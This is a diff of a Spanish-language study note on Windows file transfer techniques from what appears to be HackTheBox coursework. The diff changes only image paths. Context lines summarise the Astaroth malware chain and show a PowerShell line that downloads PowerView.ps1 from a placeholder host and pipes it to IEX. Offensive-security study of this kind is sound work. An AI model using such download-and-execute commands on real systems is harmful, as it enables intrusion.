@@ -14,7 +14,7 @@ Los atacantes utilizan métodos de transferencia de archivos para operar y evita
 ---
 - `Astaroth-Attack`: Por lo general, seguía estos pasos: Un enlace malicioso en un correo electrónico de spear-phising conducía a un archivo LNK. Al hacer doble clic, el archivo LNK provocaba la ejecución de la `herramienta WMIC` con el parámetro `/format`, que permitía la descarga y ejecución de código JavaScript malicioso. A su vez, el código descargaba cargas útiles abusando de la herramienta Bitsadmin.
 
-![Pasted image 20250611214111.png](/img/user/Pasted%20image%2020250611214111.png)
+![Pasted image 20250611214111.png](/img/user/imgs/Pasted%20image%2020250611214111.png)
 
 ---
 
@@ -26,7 +26,7 @@ Un paso esencial en el uso de este método es asegurarse de que el archivo que c
 
 ###### Ejemplo:
 
-![Pasted image 20250611214940.png](/img/user/Pasted%20image%2020250611214940.png)
+![Pasted image 20250611214940.png](/img/user/imgs/Pasted%20image%2020250611214940.png)
 - Pwnbox Check SSH Key MD5 Hash 
 ``` c
 MrBloody01@htb[/htb]$ md5sum id_rsa
@@ -53,7 +53,7 @@ Finalmente, podemos confirmar si el archivo se transfirió correctamente usando 
 
 ---
 ###### Confirmación de la coincidencia de hashes MD5:
-![Pasted image 20250611220703.png](/img/user/Pasted%20image%2020250611220703.png)
+![Pasted image 20250611220703.png](/img/user/imgs/Pasted%20image%2020250611220703.png)
 
 ## Descargas web de PowerShell:
 
@@ -61,14 +61,14 @@ La mayoría de las empresas permiten HTTP y HTTPS Tráfico saliente a través de
 
 En cualquier versión de PowerShell, la clase `System.Net.WebClient` se puede usar para descargar un archivo a través de `HTTP`, `HTTPS`, o `FTP`. En la *tabla* siguiente se describen los métodos `WebClient` para descargar datos de un recurso.
 
-![Pasted image 20250611221222.png](/img/user/Pasted%20image%2020250611221222.png)
+![Pasted image 20250611221222.png](/img/user/imgs/Pasted%20image%2020250611221222.png)
 
 ---
-![Pasted image 20250611221326.png](/img/user/Pasted%20image%2020250611221326.png)
+![Pasted image 20250611221326.png](/img/user/imgs/Pasted%20image%2020250611221326.png)
 
 ---------
 
-![Pasted image 20250611221419.png](/img/user/Pasted%20image%2020250611221419.png)
+![Pasted image 20250611221419.png](/img/user/imgs/Pasted%20image%2020250611221419.png)
 
 ---
 
@@ -76,7 +76,7 @@ En cualquier versión de PowerShell, la clase `System.Net.WebClient` se puede us
 
 Puede haber casos en los que la configuración del primer inicio de Internet Explorer no se haya completado, lo que impide la descarga. 
 
-![Pasted image 20250611221615.png](/img/user/Pasted%20image%2020250611221615.png)
+![Pasted image 20250611221615.png](/img/user/imgs/Pasted%20image%2020250611221615.png)
 
 Esto se puede omitir usando el parámetro `-UseBasicParsing.`
 ``` PowerShell
@@ -98,8 +98,8 @@ PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 # Cheatsheet File Transfer Windows
 
 
-![Pasted image 20250613042024.png](/img/user/Pasted%20image%2020250613042024.png)
-![Pasted image 20250613042057.png](/img/user/Pasted%20image%2020250613042057.png)
+![Pasted image 20250613042024.png](/img/user/imgs/Pasted%20image%2020250613042024.png)
+![Pasted image 20250613042057.png](/img/user/imgs/Pasted%20image%2020250613042057.png)
 
 ---
 #file-transfer #windows 
